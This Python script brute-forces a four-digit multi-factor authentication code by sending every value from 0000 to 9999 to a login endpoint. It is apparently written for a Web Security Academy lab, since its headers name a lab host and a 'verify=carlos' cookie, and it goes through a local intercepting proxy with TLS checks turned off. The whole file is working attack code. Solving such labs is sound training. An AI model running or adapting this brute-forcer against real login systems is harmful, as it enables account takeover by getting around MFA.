import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

headers = {
    "Host": "0ab8009f031710c7841a777d00b2005b.web-security-academy.net",
    "Cookie": "verify=carlos; session=70kW0tP5dCc7lLh5AKfCg7E8kvBDULdU",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://0ab8009f031710c7841a777d00b2005b.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0ab8009f031710c7841a777d00b2005b.web-security-academy.net/login2",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
}


def brute_force_mfa(s, url):
    for code in range(10000):  # 0000 to 9999
        mfa_code = f"{code:04}"  # Format code as 4-digit number, e.g., 0001
        data = {"mfa-code": mfa_code}

        try:
            # Send POST request
            response = s.post(url, headers=headers, data=data, verify=False, proxies=proxies, timeout=5, allow_redirects=False)

            # Log response for debugging
            print(f"Attempted code: {mfa_code}, Response: {response.status_code}")

            # Analyze the response to check if the code is correct
            if response.status_code == 302:  # Check for redirect
                print(f"Correct MFA code found: {mfa_code}")
                print("Redirect Location:", response.headers.get('Location', 'No location header'))
                break

        except requests.exceptions.RequestException as e:
            print(f"Error for code {mfa_code}: {e}")

        # Optional delay to avoid rate limiting
        time.sleep(0.1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    brute_force_mfa(s, url)

if __name__ == "__main__":
    main()